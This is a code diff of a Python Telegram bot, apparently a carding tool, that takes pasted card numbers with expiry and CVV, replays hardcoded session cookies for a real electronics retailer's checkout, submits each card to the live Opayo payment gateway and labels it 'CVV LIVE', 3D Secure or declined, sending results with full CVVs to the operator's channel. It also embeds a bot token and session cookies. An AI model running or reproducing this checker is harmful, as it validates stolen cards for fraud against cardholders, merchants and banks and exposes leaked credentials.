@@ -1,34 +1,43 @@
-import os
-import asyncio
-import threading
-from datetime import datetime
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
-import requests
-from bs4 import BeautifulSoup
-import json
-import random
-import string
-import time
 import re
+import requests
+import json
+from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse, parse_qs, unquote
 import urllib3
+from datetime import datetime
+import time
+import telebot
+from threading import Thread
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== الإعدادات ==========
+# ============================================================
+# CONFIGURATION
+# ============================================================
 BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
-ADMIN_IDS = [5895491379, 844663875]
-CHANNEL_ID = -1003292682385
+bot = telebot.TeleBot(BOT_TOKEN)
 
-# ========== Opayo Settings ==========
+# Subscribers Configuration
+SUBSCRIBERS = {
+    844663875: {  # Mostafa's User ID
+        "name": "Mostafa Ragab",
+        "channel_id": -1003292682385  # His channel ID (UPDATE THIS!)
+    }
+    # Add more subscribers here:
+    # 123456789: {
+    #     "name": "Another User",
+    #     "channel_id": -1001234567890
+    # }
+}
+
 BASE = "https://www.rapidonline.com"
 BASKET_URL = BASE + "/checkout/basket"
 TOORDER_URL = BASE + "/checkout/basket/toorder"
 PARAMS = {"pEx": "4"}
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
 
+# Initial cookies
 initial_cookies = {
     'lantern': 'acae1b5d-f800-4e2d-8364-1492a117d8c1',
     'wtstp_nv': '1',
@@ -54,67 +63,57 @@ initial_cookies = {
     'ra_session': 'CfDJ8IAvExQjoXNFuGlpY7xOM3TJD4kqy8kVk6kVCtL1MaLncrAvGsYfuqvAKguiOqqIJ5nvChsN4WyCrXhVAOYEUoSvxN%2BhdhENvJ96YY1RhQ5TwZaSqC9ldGBNg6VqC0aaxR4Dv44R3jIzmMKkYD6VbGlf%2BK%2BdqAWgWCUp3e8Vz3UG',
 }
 
-# ========== إحصائيات ==========
-stats = {
-    'total': 0,
-    'checking': 0,
-    'approved': 0,
-    'ccn': 0,
-    'declined': 0,
-    'errors': 0,
-    'start_time': None,
-    'is_running': False,
-    'dashboard_message_id': None,
-    'chat_id': None,
-    'current_card': '',
-    'error_details': {},
-    'last_response': 'Waiting...',
-    'cards_checked': 0,
-    'approved_cards': [],
-    'ccn_cards': [],
-}
+# ============================================================
+# CARD CHECKING FUNCTIONS
+# ============================================================
 
-# ========== Opayo Functions ==========
 def analyze_response(html_content):
-    """تحليل الاستجابة وإرجاع الحالة"""
+    """Analyze response and return status"""
     html_lower = html_content.lower()
     
+    # Check for CCN (3D Secure Challenge)
     if 'paymentauthenticationchallenge' in html_lower or 'action="https://hk.paymentauthenticationchallenge' in html_lower:
         return "CCN", "3D Secure Challenge Required"
     
+    # Check for Approved (Authorization in progress)
     if 'your payment is being authorised' in html_lower or 'opayo - authorisation' in html_lower:
         return "APPROVED", "Payment Approved - CVV LIVE"
     
+    # Check for Declined (3DS Failed)
     if '3d-authentication failed' in html_lower and 'rejected by the issuer' in html_lower:
-        return "DECLINED", "3D Authentication Failed"
+        return "DECLINED", "3D Authentication Failed - Rejected by Issuer"
     
+    # Check for card errors
     if 'card expiry date is invalid' in html_lower:
-        return "ERROR", "Invalid Expiry Date"
+        return "ERROR", "Invalid Card Expiry Date"
     
     if 'the card number is not valid' in html_lower:
         return "ERROR", "Invalid Card Number"
     
     if 'security code' in html_lower and 'invalid' in html_lower:
-        return "ERROR", "Invalid CVV"
+        return "ERROR", "Invalid CVV/Security Code"
     
+    # Check for generic errors
     if 'error processing transaction' in html_lower or 'server error' in html_lower:
         return "ERROR", "Transaction Error"
     
     return "UNKNOWN", "Unknown Response"
 
 def get_opayo_cookies():
-    """استخراج كوكيز Opayo من التدفق"""
+    """Extract Opayo cookies from the flow"""
     s = requests.Session()
     s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
     s.cookies.update(initial_cookies)
     
     try:
+        # 1) GET basket
         r = s.get(BASKET_URL, params=PARAMS, timeout=30)
         soup = BeautifulSoup(r.text, "html.parser")
         
         uid = (soup.find("input", {"name": "UniqueRequestId"}) or {}).get("value")
         token = (soup.find("input", {"name": "__RequestVerificationToken"}) or {}).get("value")
         
+        # Fallback regex
         if not uid:
             m = re.search(r'name=["\']UniqueRequestId["\'][^>]*value=["\']([0-9a-f-]{36})["\']', r.text, re.I|re.S)
             uid = m.group(1) if m else None
@@ -125,6 +124,7 @@ def get_opayo_cookies():
         if not uid or not token:
             return None
         
+        # 2) POST toorder
         headers_post = {
             "accept": "application/json, text/javascript, */*; q=0.01",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -143,6 +143,7 @@ def get_opayo_cookies():
         }
         r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False)
         
+        # Parse redirect URL
         redirect_url = None
         try:
             j = r2.json()
@@ -164,11 +165,13 @@ def get_opayo_cookies():
         else:
             opayo_url = redirect_url
         
+        # 3) Follow Opayo flow
         s.get(opayo_url, allow_redirects=True, timeout=30, verify=False)
         s.get("https://live.opayo.eu.elavon.com/gateway/service/carddetails", 
               headers={"Referer": opayo_url, "Origin": "https://live.opayo.eu.elavon.com"}, 
               allow_redirects=True, timeout=30, verify=False)
         
+        # 4) Extract cookies
         wanted = "live.opayo.eu.elavon.com"
         def domain_match(cd, wd=wanted):
             if not cd: return False
@@ -182,116 +185,70 @@ def get_opayo_cookies():
         return cookies
         
     except Exception as e:
-        print(f"[!] خطأ في استخراج الكوكيز: {e}")
         return None
 
-# ========== 🔥 إرسال النتائج للقناة ==========
-async def send_to_channel(bot_app, card, status_type, message):
-    """إرسال نتيجة مباشرة للقناة"""
+def check_card(card_data):
+    """Check a single card"""
     try:
-        card_number = stats['approved'] + stats['ccn']
+        # Get fresh cookies for each card
+        opayo_cookies = get_opayo_cookies()
+        if not opayo_cookies:
+            return {
+                "card": card_data,
+                "status": "ERROR",
+                "message": "Failed to extract cookies",
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
         
-        if status_type == 'APPROVED':
-            text = (
-                "╔═══════════════════╗\n"
-                "✅ **APPROVED CARD LIVE** ✅\n"
-                "╚═══════════════════╝\n\n"
-                f"💳 `{card}`\n"
-                f"🔥 Status: **CVV LIVE - Approved**\n"
-                f"📊 Card #{card_number}\n"
-                f"⚡️ Opayo Gateway\n"
-                "╚═══════════════════╝"
-            )
-            stats['approved_cards'].append(card)
-            
-        elif status_type == 'CCN':
-            text = (
-                "╔═══════════════════╗\n"
-                "⚠️ **CCN CARD (3D SECURE)** ⚠️\n"
-                "╚═══════════════════╝\n\n"
-                f"💳 `{card}`\n"
-                f"🔥 Status: **3D Secure Challenge**\n"
-                f"📊 Card #{card_number}\n"
-                f"⚡️ Opayo Gateway\n"
-                "╚═══════════════════╝"
-            )
-            stats['ccn_cards'].append(card)
+        card_number, exp_month, exp_year, cvv = card_data.split("|")
+        card_number = card_number.strip()
+        exp_month = exp_month.strip().zfill(2)
+        exp_year = exp_year.strip()
         
-        await bot_app.bot.send_message(
-            chat_id=CHANNEL_ID,
-            text=text,
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")
-
-# ========== فحص البطاقة ==========
-async def check_card(card, bot_app):
-    parts = card.strip().split('|')
-    if len(parts) != 4:
-        stats['errors'] += 1
-        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
-        stats['checking'] -= 1
-        stats['last_response'] = 'Format Error'
-        await update_dashboard(bot_app)
-        return card, "ERROR", "صيغة خاطئة"
-    
-    card_number, exp_month, exp_year, cvv = parts
-    card_number = card_number.strip()
-    exp_month = exp_month.strip().zfill(2)
-    exp_year = exp_year.strip()
-    
-    if len(exp_year) == 4:
-        exp_year = exp_year[-2:]
-    
-    cvv = cvv.strip()
-    
-    # Get fresh cookies
-    opayo_cookies = get_opayo_cookies()
-    if not opayo_cookies:
-        stats['errors'] += 1
-        stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
-        stats['checking'] -= 1
-        stats['last_response'] = 'Cookie Error'
-        await update_dashboard(bot_app)
-        return card, "ERROR", "فشل في استخراج الكوكيز"
-    
-    headers_card = {
-        'Host': 'live.opayo.eu.elavon.com',
-        'Cache-Control': 'max-age=0',
-        'Sec-Ch-Ua': '"Chromium";v="141", "Not?A_Brand";v="8"',
-        'Sec-Ch-Ua-Mobile': '?0',
-        'Sec-Ch-Ua-Platform': '"Windows"',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Origin': 'https://live.opayo.eu.elavon.com',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': UA,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': 'iframe',
-        'Referer': 'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
-        'Priority': 'u=0, i',
-    }
-    
-    data_card = {
-        'browserJavaEnabled': 'false',
-        'browserColorDepth': '24',
-        'browserScreenHeight': '786',
-        'browserScreenWidth': '1397',
-        'browserTZ': '-180',
-        'challengeWindowSize': '05',
-        'cardholder': 'details saad',
-        'cardnumber': card_number,
-        'expirymonth': exp_month,
-        'expiryyear': exp_year,
-        'securitycode': cvv,
-        'action': 'proceed',
-    }
-    
-    try:
+        # Convert year to last 2 digits
+        if len(exp_year) == 4:
+            exp_year = exp_year[-2:]
+        
+        cvv = cvv.strip()
+        
+        # Prepare headers
+        headers_card = {
+            'Host': 'live.opayo.eu.elavon.com',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Chromium";v="141", "Not?A_Brand";v="8"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin': 'https://live.opayo.eu.elavon.com',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': UA,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'iframe',
+            'Sec-Fetch-Storage-Access': 'active',
+            'Referer': 'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
+            'Priority': 'u=0, i',
+        }
+        
+        data_card = {
+            'browserJavaEnabled': 'false',
+            'browserColorDepth': '24',
+            'browserScreenHeight': '786',
+            'browserScreenWidth': '1397',
+            'browserTZ': '-180',
+            'challengeWindowSize': '05',
+            'cardholder': 'details saad',
+            'cardnumber': card_number,
+            'expirymonth': exp_month,
+            'expiryyear': exp_year,
+            'securitycode': cvv,
+            'action': 'proceed',
+        }
+        
+        # Send request
         response = requests.post(
             'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
             cookies=opayo_cookies,
@@ -301,290 +258,130 @@ async def check_card(card, bot_app):
             timeout=30
         )
         
+        # Analyze response
         status, message = analyze_response(response.text)
         
-        if status == "APPROVED":
-            stats['approved'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Approved ✅'
-            await update_dashboard(bot_app)
-            await send_to_channel(bot_app, card, "APPROVED", message)
-            return card, "APPROVED", message
-            
-        elif status == "CCN":
-            stats['ccn'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'CCN ⚠️'
-            await update_dashboard(bot_app)
-            await send_to_channel(bot_app, card, "CCN", message)
-            return card, "CCN", message
-            
-        elif status == "DECLINED":
-            stats['declined'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Declined ❌'
-            await update_dashboard(bot_app)
-            return card, "DECLINED", message
-            
-        else:
-            stats['errors'] += 1
-            stats['error_details'][status] = stats['error_details'].get(status, 0) + 1
-            stats['checking'] -= 1
-            stats['last_response'] = f'{status}'
-            await update_dashboard(bot_app)
-            return card, status, message
-            
-    except Exception as e:
-        stats['errors'] += 1
-        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
-        stats['checking'] -= 1
-        stats['last_response'] = f'Error: {str(e)[:20]}'
-        await update_dashboard(bot_app)
-        return card, "EXCEPTION", str(e)
-
-# ========== Dashboard ==========
-def create_dashboard_keyboard():
-    elapsed = 0
-    if stats['start_time']:
-        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
-    mins, secs = divmod(elapsed, 60)
-    hours, mins = divmod(mins, 60)
-    
-    keyboard = [
-        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
-        [
-            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
-            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
-        ],
-        [
-            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
-            InlineKeyboardButton(f"⚠️ CCN: {stats['ccn']}", callback_data="ccn")
-        ],
-        [
-            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
-            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
-        ],
-        [
-            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
-        ]
-    ]
-    
-    if stats['is_running']:
-        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
-    
-    if stats['current_card']:
-        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
-    
-    return InlineKeyboardMarkup(keyboard)
-
-async def update_dashboard(bot_app):
-    """تحديث Dashboard في القناة"""
-    if stats['dashboard_message_id']:
-        try:
-            await bot_app.bot.edit_message_text(
-                chat_id=CHANNEL_ID,
-                message_id=stats['dashboard_message_id'],
-                text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
-                reply_markup=create_dashboard_keyboard(),
-                parse_mode='Markdown'
-            )
-        except:
-            pass
-
-# ========== 🔥 إنشاء الملفات النهائية ==========
-async def send_final_files(bot_app):
-    """إرسال ملفات txt للبطاقات المقبولة"""
-    try:
-        if stats['approved_cards']:
-            approved_text = "\n".join(stats['approved_cards'])
-            with open("approved_cards.txt", "w") as f:
-                f.write(approved_text)
-            await bot_app.bot.send_document(
-                chat_id=CHANNEL_ID,
-                document=open("approved_cards.txt", "rb"),
-                caption=f"✅ **Approved Cards (CVV LIVE)** ({len(stats['approved_cards'])} cards)",
-                parse_mode='Markdown'
-            )
-            os.remove("approved_cards.txt")
-        
-        if stats['ccn_cards']:
-            ccn_text = "\n".join(stats['ccn_cards'])
-            with open("ccn_cards.txt", "w") as f:
-                f.write(ccn_text)
-            await bot_app.bot.send_document(
-                chat_id=CHANNEL_ID,
-                document=open("ccn_cards.txt", "rb"),
-                caption=f"⚠️ **CCN Cards (3D Secure)** ({len(stats['ccn_cards'])} cards)",
-                parse_mode='Markdown'
-            )
-            os.remove("ccn_cards.txt")
+        return {
+            "card": card_data,
+            "card_number": card_number,
+            "exp_month": exp_month,
+            "exp_year": exp_year,
+            "cvv": cvv,
+            "status": status,
+            "message": message,
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
         
     except Exception as e:
-        print(f"[!] خطأ في إرسال الملفات: {e}")
+        return {
+            "card": card_data,
+            "status": "ERROR",
+            "message": str(e),
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
 
-# ========== معالجات البوت ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
+def format_result(result):
+    """Format result for Telegram message"""
+    card_display = f"{result['card_number'][:6]}...{result['card_number'][-4:]}" if 'card_number' in result else "Unknown"
+    exp = f"{result['exp_month']}/{result['exp_year']}" if 'exp_month' in result else "N/A"
+    cvv = result.get('cvv', 'N/A')
+    status = result['status']
+    message = result['message']
+    
+    # Emoji based on status
+    if status == "APPROVED":
+        emoji = "✅"
+    elif status == "CCN":
+        emoji = "⚠️"
+    elif status == "DECLINED":
+        emoji = "❌"
+    else:
+        emoji = "⁉️"
+    
+    text = f"{emoji} **{status}**\n\n"
+    text += f"**Card:** `{card_display}`\n"
+    text += f"**Exp:** `{exp}`\n"
+    text += f"**CVV:** `{cvv}`\n"
+    text += f"**Message:** {message}\n"
+    text += f"**Time:** {result['timestamp']}\n"
+    text += f"━━━━━━━━━━━━━━━━"
+    
+    return text
+
+# ============================================================
+# TELEGRAM BOT HANDLERS
+# ============================================================
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    user_id = message.from_user.id
+    if user_id in SUBSCRIBERS:
+        subscriber = SUBSCRIBERS[user_id]
+        bot.reply_to(message, f"👋 Welcome {subscriber['name']}!\n\nSend me cards in format:\n`card|month|year|cvv`\n\nOr send multiple cards (one per line)", parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "❌ You are not authorized to use this bot.")
+
+@bot.message_handler(func=lambda message: True)
+def handle_cards(message):
+    user_id = message.from_user.id
+    
+    # Check if user is authorized
+    if user_id not in SUBSCRIBERS:
+        bot.reply_to(message, "❌ You are not authorized to use this bot.")
         return
     
-    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
-    await update.message.reply_text(
-        "📊 **OPAYO CARD CHECKER BOT**\n\n"
-        "أرسل ملف .txt يحتوي على البطاقات\n"
-        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
-        f"📢 القناة: `{CHANNEL_ID}`",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح")
+    subscriber = SUBSCRIBERS[user_id]
+    channel_id = subscriber['channel_id']
+    
+    # Extract cards from message
+    text = message.text.strip()
+    cards = [line.strip() for line in text.split('\n') if '|' in line]
+    
+    if not cards:
+        bot.reply_to(message, "❌ Invalid format. Send cards as:\n`card|month|year|cvv`", parse_mode="Markdown")
         return
     
-    if stats['is_running']:
-        await update.message.reply_text("⚠️ يوجد فحص جاري!")
-        return
+    # Notify user
+    bot.reply_to(message, f"⏳ Checking {len(cards)} card(s)...\nResults will be sent to your channel.")
     
-    file = await update.message.document.get_file()
-    file_content = await file.download_as_bytearray()
-    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
-    
-    stats.update({
-        'total': len(cards),
-        'checking': 0,
-        'approved': 0,
-        'ccn': 0,
-        'declined': 0,
-        'errors': 0,
-        'current_card': '',
-        'error_details': {},
-        'last_response': 'Starting...',
-        'cards_checked': 0,
-        'approved_cards': [],
-        'ccn_cards': [],
-        'start_time': datetime.now(),
-        'is_running': True,
-        'chat_id': update.effective_chat.id
-    })
-    
-    dashboard_msg = await context.application.bot.send_message(
-        chat_id=CHANNEL_ID,
-        text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
-        reply_markup=create_dashboard_keyboard(),
-        parse_mode='Markdown'
-    )
-    stats['dashboard_message_id'] = dashboard_msg.message_id
-    
-    await update.message.reply_text(
-        f"✅ تم بدء الفحص!\n\n"
-        f"📊 إجمالي البطاقات: {len(cards)}\n"
-        f"📢 تابع النتائج في القناة",
-        parse_mode='Markdown'
-    )
-    
-    def run_checker():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(process_cards(cards, context.application))
-        loop.close()
-    
-    threading.Thread(target=run_checker, daemon=True).start()
-
-async def process_cards(cards, bot_app):
-    """معالجة البطاقات"""
-    for i, card in enumerate(cards):
-        if not stats['is_running']:
-            break
+    # Check cards in background
+    def check_cards_thread():
+        for i, card in enumerate(cards, 1):
+            try:
+                # Send processing message
+                bot.send_message(channel_id, f"🔄 Checking card {i}/{len(cards)}...", parse_mode="Markdown")
+                
+                # Check card
+                result = check_card(card)
+                
+                # Format and send result
+                formatted_result = format_result(result)
+                bot.send_message(channel_id, formatted_result, parse_mode="Markdown")
+                
+                # Delay between checks
+                if i < len(cards):
+                    time.sleep(2)
+                    
+            except Exception as e:
+                bot.send_message(channel_id, f"❌ Error checking card {i}: {str(e)}")
         
-        stats['checking'] = 1
-        parts = card.split('|')
-        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
-        await update_dashboard(bot_app)
-        
-        await check_card(card, bot_app)
-        stats['cards_checked'] += 1
-        
-        if stats['cards_checked'] % 5 == 0:
-            await update_dashboard(bot_app)
-        
-        await asyncio.sleep(2)
+        # Send summary
+        bot.send_message(channel_id, f"✅ Finished checking {len(cards)} card(s)!", parse_mode="Markdown")
     
-    stats['is_running'] = False
-    stats['checking'] = 0
-    stats['current_card'] = ''
-    stats['last_response'] = 'Completed ✅'
-    await update_dashboard(bot_app)
-    
-    summary_text = (
-        "═══════════════════\n"
-        "✅ **اكتمل الفحص!** ✅\n"
-        "═══════════════════\n\n"
-        f"📊 **الإحصائيات النهائية:**\n"
-        f"🔥 الإجمالي: {stats['total']}\n"
-        f"✅ Approved (CVV LIVE): {stats['approved']}\n"
-        f"⚠️ CCN (3D Secure): {stats['ccn']}\n"
-        f"❌ Declined: {stats['declined']}\n"
-        f"⚠️ Errors: {stats['errors']}\n\n"
-        "📁 **جاري إرسال الملفات...**"
-    )
-    
-    await bot_app.bot.send_message(
-        chat_id=CHANNEL_ID,
-        text=summary_text,
-        parse_mode='Markdown'
-    )
-    
-    await send_final_files(bot_app)
-    
-    final_text = (
-        "╔═══════════════════╗\n"
-        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
-        "╚═══════════════════╝\n\n"
-        "✅ تم إرسال جميع الملفات\n"
-        "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Opayo Gateway"
-    )
-    
-    await bot_app.bot.send_message(
-        chat_id=CHANNEL_ID,
-        text=final_text,
-        parse_mode='Markdown'
-    )
+    # Start thread
+    Thread(target=check_cards_thread, daemon=True).start()
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
-        return
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    
-    if query.from_user.id not in ADMIN_IDS:
-        await query.answer("❌ غير مصرح", show_alert=True)
-        return
-    
-    await query.answer()
-    
-    if query.data == "stop_check":
-        stats['is_running'] = False
-        await update_dashboard(context.application)
-        await query.message.reply_text("🛑 تم إيقاف الفحص!")
-
-def main():
-    print("[🤖] Starting Opayo Telegram Bot...")
-    print(f"[📢] Channel ID: {CHANNEL_ID}")
-    
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(CallbackQueryHandler(button_callback))
-    
-    print("[✅] Bot is running...")
-    app.run_polling()
+# ============================================================
+# MAIN
+# ============================================================
 
 if __name__ == "__main__":
-    main()
+    print("=" * 70)
+    print("           OPAYO TELEGRAM BOT CHECKER")
+    print("=" * 70)
+    print(f"\n✅ Bot started successfully!")
+    print(f"📡 Waiting for messages...\n")
+    print("=" * 70)
+    
+    # Start bot
+    bot.polling(none_stop=True)
